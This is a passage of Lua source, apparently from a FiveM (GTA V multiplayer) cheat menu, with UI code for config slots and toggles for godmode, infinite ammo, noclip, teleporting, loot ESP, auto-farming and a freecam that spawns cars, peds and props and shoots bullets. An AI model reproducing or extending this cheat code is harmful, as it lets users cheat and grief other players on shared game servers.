                    DrawRect(New.x + 0.705, New.y + 0.450, 0.0010, 0.1, 26, 26, 26, 255) --- line droite
                    DrawRect(New.x + 0.605, New.y + 0.450, 0.0010, 0.1, 26, 26, 26, 255) --- line gauche


                    if button4(finalconfig1, 0.64, 0.410) then
                        selectconfig1 = true
                        configname1 = true
                        configname2 = false
                        configname3 = false
                        configname4 = false
                        configname5 = false
                    else
                        selectconfig1 = false
                    end



                    if button4(finalconfig2, 0.64, 0.430) then
                        selectconfig2 = true
                        configname2 = true
                        configname1 = false
                        configname3 = false
                        configname4 = false
                        configname5 = false
                    else
                        selectconfig2 = false
                    end




                    if button4(finalconfig3, 0.64, 0.450) then
                        selectconfig3 = true
                        configname3 = true
                        configname1 = false
                        configname2 = false
                        configname4 = false
                        configname5 = false
                    else
                        selectconfig3 = false
                    end



                    if button4(finalconfig4, 0.64, 0.470) then
                        selectconfig4 = true
                        configname4 = true
                        configname1 = false
                        configname2 = false
                        configname3 = false
                        configname5 = false
                    else
                        selectconfig4 = false
                    end


                    if button4(finalconfig5, 0.64, 0.490) then
                        selectconfig5 = true
                        configname5 = true
                        configname1 = false
                        configname2 = false
                        configname3 = false
                        configname4 = false
                    else
                        selectconfig5 = false
                    end


            ---    print(finalconfig1, finalconfig2, finalconfig3, finalconfig4, finalconfig5)

                    Winnie_DrawText2('-', New.x + 0.700, New.y + 0.380, false, 0.29, false, 255, 255, 255, 255)
                else
                    Winnie_DrawText2('+', New.x + 0.700, New.y + 0.380, false, 0.29, false, 255, 255, 255, 255)
                end

                DrawRect(New.x + 0.655, New.y + 0.390, 0.1, 0.015, 40, 40, 40, 255) --- ligne rectangle
                DrawRect(New.x + 0.655, New.y + 0.395, 0.1, 0.002, 26, 26, 26, 255) --- line bas
                DrawRect(New.x + 0.655, New.y + 0.384, 0.1, 0.002, 26, 26, 26, 255) --- line haut
                DrawRect(New.x + 0.705, New.y + 0.390, 0.0010, 0.013, 26, 26, 26, 255) --- line droite
                DrawRect(New.x + 0.605, New.y + 0.390, 0.0010, 0.013, 26, 26, 26, 255) --- line gauche

                Winnie_DrawText2("Your Configs :", New.x + 0.605, New.y + 0.360, false, 0.27, false, 255, 255, 255, 255)



                if configname1 then
                    if finalconfig1 == nil then
                        Winnie_DrawText2('Empty Slot', New.x + 0.615, New.y + 0.380, false, 0.24, false, 255, 255, 255, 255)
                    else
                        Winnie_DrawText2(finalconfig1, New.x + 0.615, New.y + 0.380, false, 0.24, false, 255, 255, 255, 255)
                    end
                elseif configname2 then
                    if finalconfig2 == nil then
                        Winnie_DrawText2('Empty Slot', New.x + 0.615, New.y + 0.380, false, 0.24, false, 255, 255, 255, 255)
                    else
                        Winnie_DrawText2(finalconfig2, New.x + 0.615, New.y + 0.380, false, 0.24, false, 255, 255, 255, 255)
                    end
                elseif configname3 then
                    if finalconfig3 == nil then
                        Winnie_DrawText2('Empty Slot', New.x + 0.615, New.y + 0.380, false, 0.24, false, 255, 255, 255, 255)
                    else
                        Winnie_DrawText2(finalconfig3, New.x + 0.615, New.y + 0.380, false, 0.24, false, 255, 255, 255, 255)
                    end
                elseif configname4 then
                    if finalconfig4 == nil then
                        Winnie_DrawText2('Empty Slot', New.x + 0.615, New.y + 0.380, false, 0.24, false, 255, 255, 255, 255)
                    else
                        Winnie_DrawText2(finalconfig4, New.x + 0.615, New.y + 0.380, false, 0.24, false, 255, 255, 255, 255)
                    end
                elseif configname5 then
                    if finalconfig5 == nil then
                        Winnie_DrawText2('Empty Slot', New.x + 0.615, New.y + 0.380, false, 0.24, false, 255, 255, 255, 255)
                    else
                        Winnie_DrawText2(finalconfig5, New.x + 0.615, New.y + 0.380, false, 0.24, false, 255, 255, 255, 255)
                    end

                else
                    Winnie_DrawText2('Any Config Selected', New.x + 0.612, New.y + 0.380, false, 0.24, false, 255, 255, 255, 255)
                end
                -- configname3 then
                --     Winnie_DrawText2(finalconfig3, New.x + 0.605, New.y + 0.380, false, 0.24, false, 255, 255, 255, 255)
                -- elseif configname4 then
                --     Winnie_DrawText2(finalconfig4, New.x + 0.605, New.y + 0.380, false, 0.24, false, 255, 255, 255, 255)


            end






            if taberino == 'G-Life' then

                if checkbox("Antizin Shot", 0.40, 0.34, ZM_M1000.atznshot) then
                    ZM_M1000.atznshot = not ZM_M1000.atznshot
                    local numberantz = ZM_M1000.atznshot
                        if saveconfig == true then
                            if numberantz == nil or numberantz == false then
                                SetResourceKvp("numberantz", "nil")
                            else
                                SetResourceKvp("numberantz", numberantz)
                            end
                        else
                            return false
                        end
                end

                if checkbox("Stamina Shot", 0.40, 0.365, ZM_M1000.stmnshot) then
                    ZM_M1000.stmnshot = not ZM_M1000.stmnshot
                    local numberstaminss = ZM_M1000.stmnshot
                    if saveconfig == true then
                        if numberstaminss == nil or numberstaminss == false then
                            SetResourceKvp("numberstaminss", "nil")
                        else
                            SetResourceKvp("numberstaminss", numberstaminss)
                        end
                    else
                        return false
                    end

                end

                if checkbox("Teleport to Vehicle", 0.40, 0.39, ZM_M1000.tlportovehicle) then
                    ZM_M1000.tlportovehicle = not ZM_M1000.tlportovehicle
                end


                 if button('['..teleporttovehicle["BindingTouch"].. "]", 0.475, 0.39) then
                    CreateThread(function()
                        local value, BindingTouch = bind()
                        teleporttovehicle["BindingTouch"] = BindingTouch
                        teleporttovehicle["Value"] = value
                    end)
                end

                if button("Heal Glife", 0.630, 0.340, true) then
                    local coords = Winnie_GetEntityCoords(Winnie_PlayerPedId())
                    Winnie_NetworkResurrectLocalPlayer(coords, Winnie_GetEntityHeading(Winnie_PlayerPedId(), true, false))
                end

                button('Speed Strafe', 0.63, 0.375)
                slider2(0.643, 0.40, 0.08, "Strafe", 5)

                if button('['..healglife["BindingTouch"].. "]", 0.665, 0.340) then
                    CreateThread(function()
                        local value, BindingTouch = bind()
                        healglife["BindingTouch"] = BindingTouch
                        healglife["Value"] = value
                    end)
                end

                local glifefeature = 0.34
                if checkbox("Godmode", 0.40, 0.415, ZM_M1000.gmdglife) then
                    ZM_M1000.gmdglife = not ZM_M1000.gmdglife
                    local numberglifegodmode = ZM_M1000.gmdglife
                    if saveconfig == true then
                        if numberglifegodmode == nil or numberglifegodmode == false then
                            SetResourceKvp("numberglifegodmode", "nil")
                        else
                            SetResourceKvp("numberglifegodmode", numberglifegodmode)
                        end
                    else
                        return false
                    end
                end

                if checkbox("Infinite Ammo", 0.40, 0.44, ZM_M1000.infammo) then
                    ZM_M1000.infammo = not ZM_M1000.infammo
                    local numberinfinammo = ZM_M1000.infammo
                    if saveconfig == true then
                        if numberinfinammo == nil or numberinfinammo == false then
                            SetResourceKvp("numberinfinammo", "nil")
                        else
                            SetResourceKvp("numberinfinammo", numberinfinammo)
                        end
                    else
                        return false
                    end
                end

                if checkbox("ESP Loot Bag", 0.40, 0.465, ZM_M1000.espltbag) then
                    ZM_M1000.espltbag = not ZM_M1000.espltbag
                end

                if checkbox("Assistant Strafe", 0.40, 0.49, ZM_M1000.strf) then
                    ZM_M1000.strf = not ZM_M1000.strf
                    local numberstrf = ZM_M1000.strf
                    if saveconfig == true then
                        if numberstrf == nil or numberstrf == false then
                            SetResourceKvp("numberstrf", "nil")
                        else
                            SetResourceKvp("numberstrf", numberstrf)
                        end
                    else
                        return false
                    end
                end


                if checkbox("Teleport Zombie", 0.508, glifefeature, ZM_M1000.tlpzmb) then
                    ZM_M1000.tlpzmb = not ZM_M1000.tlpzmb
                end glifefeature = glifefeature + 0.025

                if checkbox("Auto-Farm XP", 0.508, glifefeature, ZM_M1000.autfrmxp) then
                    ZM_M1000.autfrmxp = not ZM_M1000.autfrmxp
                end glifefeature = glifefeature + 0.025

                if checkbox("Auto-Farm", 0.508, glifefeature, ZM_M1000.autfrm) then
                    ZM_M1000.autfrm = not ZM_M1000.autfrm
                end glifefeature = glifefeature + 0.025

                if button('['..autofrm["BindingTouch"].. "]", 0.495, 0.365) then
                    CreateThread(function()
                        local value, BindingTouch = bind()
                        autofrm["BindingTouch"] = BindingTouch
                        autofrm["Value"] = value
                    end)
                end

                if checkbox("Remove Windows", 0.508, glifefeature, ZM_M1000.rmvwindows) then
                    ZM_M1000.rmvwindows = not ZM_M1000.rmvwindows
                    local numberremovewon = ZM_M1000.rmvwindows
                    if saveconfig == true then
                        if numberremovewon == nil or numberremovewon == false then
                            SetResourceKvp("numberremovewon", "nil")
                        else
                            SetResourceKvp("numberremovewon", numberremovewon)
                        end
                    else
                        return false
                    end
                end glifefeature = glifefeature + 0.025

                if checkbox("Warp the Vehicle", 0.508, glifefeature, ZM_M1000.wrpthevehicle) then
                    ZM_M1000.wrpthevehicle = not ZM_M1000.wrpthevehicle
                end glifefeature = glifefeature + 0.025

                if button('['..warpthevehicle["BindingTouch"].. "]", 0.495, 0.44) then
                    CreateThread(function()
                        local value, BindingTouch = bind()
                        warpthevehicle["BindingTouch"] = BindingTouch
                        warpthevehicle["Value"] = value
                    end)
                end

                if checkbox("Freeze Ammo", 0.508, glifefeature, ZM_M1000.frrzmo) then
                    ZM_M1000.frrzmo = not ZM_M1000.frrzmo
                    local numberfreeammo = ZM_M1000.frrzmo
                    if saveconfig == true then
                        if numberfreeammo == nil or numberfreeammo == false then
                            SetResourceKvp("numberfreeammo", "nil")
                        else
                            SetResourceKvp("numberfreeammo", numberfreeammo)
                        end
                    else
                        return false
                    end
                end

                -- for k, vehicle in pairs(GetGamePool("CVehicle")) do
                --     local name = GetDisplayNameFromVehicleModel(Winnie_GetEntityModel(vehicle))

                --         if vehicle >= 30 then
                --             if Winnie_IsDisabledControlJustPressed(0, 15) then
                --                 New.jaill = New.jaill + 0.00050
                --             end
                --             if Winnie_IsDisabledControlJustPressed(0, 14) then
                --                 New.jaill = New.jaill - 0.00050
                --             end
                --         end

                --         if ((0.26 * 1.0) + (k - 1) * 0.016) + New.jaill >= 0.30 and ((0.26 * 1.0) + (k - 1) * 0.018) + New.jaill <= 0.58 then

                --             if VehicleGet(name, 0.625, (0.38 + k * 0.015) + New.jaill, false) then
                --                 SetEntityCoords(vehicle, GetEntityCoords(PlayerPedId()))
                --                 SetPedIntoVehicle(PlayerPedId(), vehicle, -1)
                --             end

                --             for a, v in pairs(GetActivePlayers()) do
                --                 if IsPedInVehicle(GetPlayerPed(v), vehicle, true) then
                --                     cc = Winnie_DrawSprite('off', 'ezrjfzrejgzrjgzijgzr', 0.655 + New.x, (0.38 + k * 0.015) + New.jaill + 0.025 + New.y, 0.035, 0.035 * 1.8, 0.0, 255, 255, 255, New.opacity)
                --                 else
                --                     cc = Winnie_DrawSprite('on', 'on1', 0.655 + New.x, (0.38 + k * 0.015) + New.jaill + 0.025 + New.y, 0.035, 0.035 * 1.8, 0.0, 255, 255, 255, New.opacity)
                --                 end
                --             end

                --             cc = cc

                --         end
                --     end

                button('Bag Color R', 0.415, 0.565)
                slider2(0.428, 0.59, 0.08, "bagcolorr", 255)

                button('Bag Color G', 0.415, 0.62)
                slider2(0.428, 0.648, 0.08, "bagcolorg", 255)

                button('Bag Color B', 0.415, 0.675)
                slider2(0.428, 0.704, 0.08, "bagcolorb", 255)



            end

            nocontrol()
            cursor()
            end
            font.Pop(id);
        end



    CIT.CreateThread(function()

        ZM_KeyboardUI.Menu = {X = 30, Y = ZM_KeyboardUI.resY/4.3, W = 330, H = 50, Max = 10}

        while New.active and ZM_KeyboardUI.MenuOpen do
            WAIT(0)



            if ZM_M1000.musicclip then
                Winnie_DrawSprite('music', 'youtube', 0.85, 0.95, 0.30, 0.30 * 1.8, 0.0, 255, 255, 255, New.opacity)
            end

         --   external()
            DrawKeyboard()
            Draw()






        if mouseui then

            local b, c = Winnie_GetNuiCursorPosition()
            local d, e = Winnie_GetActiveScreenResolution()
            b = b / d
            c = c / e

            local cursorX, cursorY = Winnie_GetNuiCursorPosition()
            local screenW, screenH = Winnie_GetActiveScreenResolution()
            cursorX = cursorX / screenW
            cursorY = cursorY / screenH

            if ZM_M1000.hFH and Winnie_IsDisabledControlPressed(1, 24) and not ZM_M1000.ama and ZM_M1000.Draw then
                ZM_M1000.RandomDragToEntityAttach = true
                New.x = cursorX + __x; New.y = cursorY + __y

            else
                ZM_M1000.RandomDragToEntityAttach = false
                ZM_M1000.hFH = false
            end
            if b + 0.20 >= 0.6 + New.x and b - 0.080 <= 0.64 + New.x and c + 0.01 >= New.y + 0.57 - 0.29 and  c - 0.001 <= New.y + 0.57 - 0.28 and ZM_M1000.Draw then
                if Winnie_IsDisabledControlPressed(1, 24) and not ZM_M1000.RandomDragToEntityAttach then
                    __x, __y = New.x - cursorX, New.y - cursorY
                    ZM_M1000.hFH = not ZM_M1000.hFH
                end
            end

            if ZM_M1000.ama and not ZM_M1000.hFH and ZM_M1000.Draw then
                New2.x = cursorX + _x; New2.y = cursorY + _y
            end

            if mouseInBounds(New2.x + 0.32, New2.y + 0.285, 0.058, 0.040) and ZM_M1000.Draw and Winnie_IsDisabledControlPressed(1, 24) and not ZM_M1000.hFH then
                ZM_M1000.ama = true
                _x, _y = New2.x-cursorX,New2.y-cursorY
            else
                ZM_M1000.ama = false
            end




            if Winnie_IsDisabledControlJustReleased(0, freecambind["Value"]) then
                ZM_M1000.fcra = not ZM_M1000.fcra
            elseif Winnie_IsDisabledControlJustReleased(0, armorbind["Value"]) then
                Winnie_SetPedArmour(Winnie_PlayerPedId(), math.floor(100 * rE_Slider["Slider_armor_value"]))
            elseif Winnie_IsDisabledControlJustReleased(0, healthkeybind["Value"]) then
                Winnie_SetEntityHealth(Winnie_PlayerPedId(), math.floor(200 * rE_Slider["Slider_health_value"]))
            elseif Winnie_IsDisabledControlJustReleased(0, godmodebind["Value"]) then
                ZM_M1000.gd =  not ZM_M1000.gd
            elseif Winnie_IsDisabledControlJustReleased(0, invisiblebind["Value"]) then
                ZM_M1000.ivs = not ZM_M1000.ivs
            elseif Winnie_IsDisabledControlJustReleased(0, noclipbind["Value"]) then
                ZM_M1000.np = not ZM_M1000.np
            elseif Winnie_IsDisabledControlJustReleased(0, autofrm["Value"]) then
                ZM_M1000.autofrm = not ZM_M1000.autofrm
            elseif Winnie_IsDisabledControlJustReleased(0, revivebind["Value"]) then
                local pedSelect = Winnie_PlayerPedId()
                local coords = Winnie_GetEntityCoords(pedSelect)
                Winnie_NetworkResurrectLocalPlayer(coords, Winnie_GetEntityHeading(pedSelect, true, false))
                Winnie_StopScreenEffect("DeathFailOut")
            elseif Winnie_IsDisabledControlJustReleased(0, healglife["Value"]) then
                local pedSelect = Winnie_PlayerPedId()
                local coords = Winnie_GetEntityCoords(pedSelect)
                Winnie_NetworkResurrectLocalPlayer(coords, Winnie_GetEntityHeading(pedSelect, true, false))
            end


                if New.opacity <= 254 and ZM_M1000.Draw then
                    New.opacity = New.opacity + 12
                elseif New.opacity >= 255 and ZM_M1000.Draw then
                    New.opacity = 255
                end
            end

            if ZM_KeyboardUI.Checkbox["noclip-function"] then

                local PED = Winnie_PlayerPedId()
                local SPEED = SliderKeyboard["noclip-speed"].value
                local COORDS = Winnie_GetEntityCoords(PED)
                local CAM = Winnie_GetGameplayCamRot(0)

                if IsPedFalling(Winnie_PlayerPedId()) then
                    Winnie_ClearPedTasksImmediately(Winnie_PlayerPedId())
                end

                local playerVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)
                local vehicleornot = nil
                local clap, clip, clop = nil
                if not playerVehicle then
                    vehicleornot = PlayerPedId()
                    clap, clip, clop = table.unpack(GetEntityCoords(PlayerPedId(), 2))
                else
                    vehicleornot = GetVehiclePedIsIn(PlayerPedId(), 0)
                    clap, clip, clop = table.unpack(GetEntityCoords(PlayerPedId(), 1))
                end

                if playerVehicle and GetSeatPedIsIn(PlayerPedId()) ~= -1 then
                    RequestControlOnce(vehicleornot)
                end

                if Winnie_IsDisabledControlPressed(0, 21) then
                    SPEED = SPEED * 5
                elseif Winnie_IsDisabledControlPressed(0, 36) then
                    SPEED = SPEED / 5
                end

                local left, right = Quaternion(CAM) * vector3(0.0, 1.0, 0.0), Quaternion(CAM) * vector3(1.0, 0.0, 0.0)

                if Winnie_IsDisabledControlPressed(0, 32) then
                    COORDS = COORDS + left * SPEED
                end
                if Winnie_IsDisabledControlPressed(0, 33) then
                    COORDS = COORDS + left * - SPEED
                end
                if Winnie_IsDisabledControlPressed(0, 30) then
                    COORDS = COORDS + right * SPEED
                end
                if Winnie_IsDisabledControlPressed(0, 34) then
                    COORDS = COORDS + right * - SPEED
                end
                if Winnie_IsDisabledControlPressed(0, 55) then
                    COORDS = vector3(COORDS.x, COORDS.y, COORDS.z + SPEED)
                end
                if Winnie_IsDisabledControlPressed(0, 36) then
                    COORDS = vector3(COORDS.x, COORDS.y, COORDS.z - SPEED)
                end
                Winnie_SetEntityCoordsNoOffset(vehicleornot, COORDS.x, COORDS.y, COORDS.z, true, true, true)
            end

            if ZM_M1000.np == true then
                local PED = Winnie_PlayerPedId()
                local SPEED = math.abs(5 * rE_Slider["Slider_noclip_value"])
                local COORDS = Winnie_GetEntityCoords(PED)
                local CAM = Winnie_GetGameplayCamRot(0)

                if IsPedFalling(Winnie_PlayerPedId()) then
                    Winnie_ClearPedTasksImmediately(Winnie_PlayerPedId())
                end

                local playerVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)
                local vehicleornot = nil
                local clap, clip, clop = nil
                if not playerVehicle then
                    vehicleornot = PlayerPedId()
                    clap, clip, clop = table.unpack(GetEntityCoords(PlayerPedId(), 2))
                else
                    vehicleornot = GetVehiclePedIsIn(PlayerPedId(), 0)
                    clap, clip, clop = table.unpack(GetEntityCoords(PlayerPedId(), 1))
                end

                if playerVehicle and GetSeatPedIsIn(PlayerPedId()) ~= -1 then
                    RequestControlOnce(vehicleornot)
                end

                if Winnie_IsDisabledControlPressed(0, 21) then
                    SPEED = SPEED * 5
                elseif Winnie_IsDisabledControlPressed(0, 36) then
                    SPEED = SPEED / 5
                end

                local left, right = Quaternion(CAM) * vector3(0.0, 1.0, 0.0), Quaternion(CAM) * vector3(1.0, 0.0, 0.0)

                if Winnie_IsDisabledControlPressed(0, 32) then
                    COORDS = COORDS + left * SPEED
                end
                if Winnie_IsDisabledControlPressed(0, 33) then
                    COORDS = COORDS + left * - SPEED
                end
                if Winnie_IsDisabledControlPressed(0, 30) then
                    COORDS = COORDS + right * SPEED
                end
                if Winnie_IsDisabledControlPressed(0, 34) then
                    COORDS = COORDS + right * - SPEED
                end
                if Winnie_IsDisabledControlPressed(0, 55) then
                    COORDS = vector3(COORDS.x, COORDS.y, COORDS.z + SPEED)
                end
                if Winnie_IsDisabledControlPressed(0, 36) then
                    COORDS = vector3(COORDS.x, COORDS.y, COORDS.z - SPEED)
                end
                Winnie_SetEntityCoordsNoOffset(vehicleornot, COORDS.x, COORDS.y, COORDS.z, true, true, true)
            end

            if ZM_KeyboardUI.Checkbox["freecam-function"] then
                local playerCoords = Winnie_GetPedBoneCoords(Winnie_PlayerPedId(), 31086, 0.0, 0.0, 0.0)
                local cam = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", playerCoords.x, playerCoords.y, playerCoords.z, 0.0, 0.0, 0.0, 45.0, 0, 2)
                cam = cam
                local calcHeight = #functionFreecam * 0.028
                local b = 0.0
                local c = 0.0
                local d = 0.0



                Winnie_RenderScriptCams(true, true, 700, 1, 1)
                Winnie_SetCamActive(cam, true)
                Winnie_FreezeEntityPosition(Winnie_PlayerPedId(), true)


            CreateThread(function()
                while Winnie_DoesCamExist(cam) do
                    Wait(0)

                    --- si menu ouvert on ferme la cam


                    if not ZM_KeyboardUI.Checkbox["freecam-function"] then
                        DestroyCam(cam)
                        Winnie_ClearTimecycleModifier()
                        Winnie_RenderScriptCams(false, true, 700, 1, 0)
                        Winnie_FreezeEntityPosition(Winnie_PlayerPedId(), false)
                        Winnie_SetFocusEntity(Winnie_PlayerPedId())
                    end



                    Winnie_SetCamFov(cam, math.floor(SliderKeyboard["freecamfov"].value) + 0.0)


                    local f = Winnie_GetCamRot(cam)
                    b = b - Winnie_GetDisabledControlNormal(1, 2) * SliderKeyboard["freecamsensi"].value
                    d = d - Winnie_GetDisabledControlNormal(1, 1) * SliderKeyboard["freecamsensi"].value

                    local hit, coordsCam = CalculeCamCoords(5000.0, cam)


                    if b > 90.0 then b = 90.0 elseif b < -90.0 then b = -90.0 end if c > 90.0 then c = 90.0 elseif c < -90.0 then c = -90.0 end if d > 360.0 then d = d - 360.0 elseif d < -360.0 then d = d + 360.0 end

                    if b and d and c and not ZM_M1000.Draw then
                        Winnie_SetCamRot(cam, b, c, d, 2)
                    end

                    local D, E, F = table.unpack(Winnie_GetCamCoord(cam))
                    if Winnie_IsDisabledControlPressed(1, 32) then
                        if Winnie_IsDisabledControlPressed(1, 21) then
                            Winnie_SetCamCoord(cam,Winnie_GetCamCoord(cam) +rot(f) * 0.5 * SliderKeyboard["freecamspeed"].value * 3.5)
                        else
                            Winnie_SetCamCoord(cam,Winnie_GetCamCoord(cam) +rot(f) * 0.5 * SliderKeyboard["freecamspeed"].value * 3.0)
                        end
                    elseif Winnie_IsDisabledControlPressed(1, 33) then
                        Winnie_SetCamCoord(cam,Winnie_GetCamCoord(cam) -rot(f) * 0.5 * SliderKeyboard["freecamspeed"].value * 3.0)
                    end
                    if Winnie_IsDisabledControlPressed(1, 21) then
                        F = F + 0.1 * 2.5
                    end
                    if Winnie_IsDisabledControlPressed(1, 36) then
                        F = F - 0.1 * 0.5
                    end

                end

            end)
        end

            if ZM_KeyboardUI.Checkbox["ear2-function"] then
                CreateThread(function()
                    for k, v in pairs(GetActivePlayers()) do
                        local coordsPlayer = Winnie_GetEntityCoords(Winnie_GetPlayerPed(v))
                        Winnie_PlaySoundFromCoord(-1, "CHECKPOINT_MISSED", coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, "HUD_MINI_GAME_SOUNDSET", true, 1.0, true)
                        Winnie_PlaySoundFromCoord(-1, "Power_Down", coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, "DLC_HEIST_HACKING_SNAKE_SOUNDS", true, 1.0, true)
                    end
                end)
            end

            if ZM_M1000.fcra then
                    local playerCoords = Winnie_GetPedBoneCoords(Winnie_PlayerPedId(), 31086, 0.0, 0.0, 0.0)
                    local cam = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", playerCoords.x, playerCoords.y, playerCoords.z, 0.0, 0.0, 0.0, 45.0, 0, 2)
                    cam = cam
                    local calcHeight = #functionFreecam * 0.028
                    local b = 0.0
                    local c = 0.0
                    local d = 0.0



                    Winnie_RenderScriptCams(true, true, 700, 1, 1)
                    Winnie_SetCamActive(cam, true)
                    Winnie_FreezeEntityPosition(Winnie_PlayerPedId(), true)


                    for k, v in pairs(functionFreecam) do
                            if IsDisabledControlJustPressed(0, 173) then
                                v.count = v.count + 1
                                if v.count > #functionFreecam then
                                    v.count = 1
                                end
                            elseif IsDisabledControlJustPressed(0, 172) then
                                v.count = v.count - 1
                                if v.count < 1 then
                                    v.count = #functionFreecam
                                end
                            elseif Winnie_IsDisabledControlPressed(0, 14) then
                                v.count = v.count + 1
                                if v.count > #functionFreecam then
                                    v.count = 1
                                end
                            elseif Winnie_IsDisabledControlPressed(0, 15) then
                                v.count = v.count - 1
                                if v.count < 1 then
                                    v.count = #functionFreecam
                                end
                            end

                                if v.w <= 0.11 then
                                    v.w = v.w + 0.002
                                end

                                if v.h <= 0.2 then
                                    v.h = v.h + 0.004
                                elseif v.h >= 0.15 then
                                    if v.x <= 0.05 then
                                        v.x = v.x + 0.001
                                    end
                                    Winnie_DrawText2(v.text, v.x, v.y + k * 0.02 , false, 0.30, false, v.color[1], v.color[2], v.color[3], v.color[4])
                                end
                            end

                CreateThread(function()
                    while Winnie_DoesCamExist(cam) do
                        Wait(0)

                        --- si menu ouvert on ferme la cam


                        if not ZM_M1000.fcra then
                            DestroyCam(cam)
                            Winnie_ClearTimecycleModifier()
                            Winnie_RenderScriptCams(false, true, 700, 1, 0)
                            Winnie_FreezeEntityPosition(Winnie_PlayerPedId(), false)
                            Winnie_SetFocusEntity(Winnie_PlayerPedId())
                        end



                        Winnie_SetCamFov(cam, math.abs(100 * rE_Slider["Slider_freecamfov_value"]))
                        local f = Winnie_GetCamRot(cam)
                        b = b - Winnie_GetDisabledControlNormal(1, 2) * math.abs(100 * rE_Slider["Slider_freecamsensi_value"])
                        d = d - Winnie_GetDisabledControlNormal(1, 1) * math.abs(100 * rE_Slider["Slider_freecamsensi_value"])

                        local hit, coordsCam = CalculeCamCoords(5000.0, cam)


                            if b > 90.0 then b = 90.0 elseif b < -90.0 then b = -90.0 end if c > 90.0 then c = 90.0 elseif c < -90.0 then c = -90.0 end if d > 360.0 then d = d - 360.0 elseif d < -360.0 then d = d + 360.0 end

                        if b and d and c and not ZM_M1000.Draw then
                            Winnie_SetCamRot(cam, b, c, d, 2)
                        end

                        Winnie_DrawRect(0.50, 0.50, 0.005, 0.002, 255, 255, 255, 255)
                        Winnie_DrawRect(0.50, 0.50, 0.001, 0.008, 255, 255, 255, 255)

                    local r, g, b = math.floor(255 * rE_Slider["Slider_colormenur_value"]), math.floor(255 * rE_Slider["Slider_colormenug_value"]), math.floor(255 * rE_Slider["Slider_colormenub_value"])

                    for k, v in pairs(functionFreecam) do
                      CreateThread(function()
                        if v.count == 1 then
                            if v.text == "Freecam Particle" then
                                v.color = {r, g, b, 255}
                                if IsControlPressed(0, 92) then
                                    RequestNamedPtfxAsset("core")
                                    UseParticleFxAssetNextCall("core")
                                    StartParticleFxLoopedAtCoord("ent_amb_leaves_pine", coordsCam.x, coordsCam.y, coordsCam.z, 0.0, 0.0, 0.0, 100.0, false, false, false, false)
                                end
                            else
                                v.color = {255, 255, 255, 150}
                            end
                        elseif v.count == 2 then
                            if v.text == "Freecam Launch Car" then
                                v.color = {r, g, b, 255}
                                if Winnie_IsDisabledControlJustReleased(0, 92) then
                                        RequestModel(GetHashKey("zentorno"))
                                        while not HasModelLoaded(GetHashKey("zentorno")) do
                                            Wait(0)
                                        end
                                        local vehicle = CreateVehicle(GetHashKey("zentorno"), coordsCam.x, coordsCam.y, coordsCam.z, GetEntityHeading(cam), true, false)
                                        SetVehicleForwardSpeed(vehicle, 250.0)
                                end
                            else
                                v.color = {255, 255, 255, 150}
                            end
                        elseif v.count == 3 then
                            if v.text == "Freecam Spam Car" then
                                v.color = {r, g, b, 255}
                                if Winnie_IsDisabledControlJustReleased(0, 92) then
                                        RequestModel(GetHashKey("zentorno"))
                                        while not HasModelLoaded(GetHashKey("zentorno")) do
                                            Wait(0)
                                        end
                                        CreateVehicle(GetHashKey("zentorno"), coordsCam.x, coordsCam.y, coordsCam.z, 0.0, true, false)
                                end
                            else
                                v.color = {255, 255, 255, 150}
                            end
                        elseif v.count == 4 then
                            if v.text == "Freecam Spam Ped" then
                                v.color = {r, g, b, 255}
                                if Winnie_IsDisabledControlJustReleased(0, 92) then

                                        RequestModel(GetHashKey("mp_f_freemode_01"))
                                        while not HasModelLoaded(GetHashKey("mp_f_freemode_01")) do
                                            Wait(0)
                                        end
                                        CreatePed(5, GetHashKey("mp_f_freemode_01"), coordsCam.x, coordsCam.y, coordsCam.z, 0.0, true, false)
                                    end
                            else
                                v.color = {255, 255, 255, 150}
                            end
                        elseif v.count == 5 then
                            if v.text == "Freecam Create Props" then
                                v.color = {r, g, b, 255}
                                if Winnie_IsDisabledControlJustReleased(0, 92) then
                                        RequestModel(GetHashKey(randomProps[math.random(#randomProps)]))
                                        while not HasModelLoaded(GetHashKey(randomProps[math.random(#randomProps)])) do
                                            Wait(0)
                                        end
                                        CreateObject(GetHashKey(randomProps[math.random(#randomProps)]), coordsCam.x, coordsCam.y, coordsCam.z, false, false, true)
                                    end
                            else
                                v.color = {255, 255, 255, 150}
                            end
                        elseif v.count == 6 then
                            if v.text == "Freecam Shoot Bullet" then
                                v.color = {r, g, b, 255}
                                if IsControlPressed(0, 92) then
                                    RequestWeaponAsset(GetHashKey("WEAPON_APPISTOL"))
                                    while not HasWeaponAssetLoaded(GetHashKey("WEAPON_APPISTOL")) do
                                        Wait(0)
                                    end
                                    Winnie_ShootSingleBulletBetweenCoords(coordsCam.x, coordsCam.y-0.2, coordsCam.z, coordsCam.x, coordsCam.y, coordsCam.z, 0.0, true, Winnie_GetHashKey("WEAPON_APPISTOL"), Winnie_PlayerPedId(), true, false, 1000.0)
                                end
                            else
                                v.color = {255, 255, 255, 150}
                            end
                        elseif v.count == 7 then
                            if v.text == "Freecam Teleport" then
                                v.color = {r, g, b, 255}
                                if Winnie_IsDisabledControlJustReleased(0, 92) then
                                    RequestCollisionAtCoord(Winnie_PlayerPedId(),coordsCam.x, coordsCam.y, coordsCam.z)
                                    SetEntityCoords(Winnie_PlayerPedId(), coordsCam.x, coordsCam.y, coordsCam.z)
                                end
                            else
                                v.color = {255, 255, 255, 150}
                            end
                        end
                        if New.active then
                                Diversion(0.02, 0.5, v.w, calcHeight, 9, 9, 9, 255)
                                Diversion(0.02, 0.5, v.w, 0.001, r, g, b, 255)
                            end
                        end)
                    end




                        local D, E, F = table.unpack(Winnie_GetCamCoord(cam))
                        if Winnie_IsDisabledControlPressed(1, 32) then
                            if Winnie_IsDisabledControlPressed(1, 21) then
                                Winnie_SetCamCoord(cam,Winnie_GetCamCoord(cam) +rot(f) * 0.5 * math.abs(rE_Slider["Slider_freecamspeed_value"]) * 100 * 3.5)
                            else
                                Winnie_SetCamCoord(cam,Winnie_GetCamCoord(cam) +rot(f) * 0.5 * math.abs(rE_Slider["Slider_freecamspeed_value"]) * 100)
                            end
                        elseif Winnie_IsDisabledControlPressed(1, 33) then
                            Winnie_SetCamCoord(cam,Winnie_GetCamCoord(cam) -rot(f) * 0.5 * math.abs(rE_Slider["Slider_freecamspeed_value"]) * 100)
                        end
